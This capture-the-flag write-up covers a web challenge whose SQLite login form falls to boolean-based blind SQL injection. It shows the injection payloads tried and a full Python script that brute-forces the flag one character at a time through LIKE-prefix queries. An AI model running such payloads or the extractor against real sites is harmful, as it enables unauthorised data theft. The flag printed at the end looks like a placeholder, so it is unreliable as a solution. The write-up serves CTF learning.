# Flushed Emoji

```
score: 165      
solved: 80/xxx      
difficulty: easy        
tags: web, boolean-base sqli        
```

## Problem

80 solves / 165 points
Hi guys! I just learned sqlite3 build my own websiteeee. Come visit my my website pleaseeee i am ami the dhedghog!!! :3 ( ◡‿◡ *)


## Try Sqli 

- I send any string 'a' -> `wrong!!! (｡•̀ᴗ-)✧ `
- I send pyload `' or 1=1 -- -`  -> `(≧U≦❁) You got it!!! `


## "Ăn rùa"
- I try send payload: `' or name like 'LITCTF%' -- -` and result: `(≧U≦❁) You got it!!! `.  Pass
- I make a script for brute force flag 

```py
import requests
import re
import sys, json
import string
def blindSqli():
    extracted_data = ""
    for index in range(1,33):
        for i in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!{}#$&()*+,-./:;<=>?@[\\]^`{|}~_":
            query = "' or name like 'LITCTF{"+extracted_data+i+"%' ESCAPE '@' -- -"	
            data= {"name": query}
            header = {"Content-Type": "application/x-www-form-urlencoded"}
                #print(data)
            r = requests.post("http://litctf.live:31770/", headers=header, data=data)
            print(i,  extracted_data)
            if "You got it" in r.text:	
                extracted_data += i
                print(extracted_data)
                break
    return extracted_data

if __name__ == "__main__":
    blindSqli()


```

We got the flag: `LITCTF{sldjf}`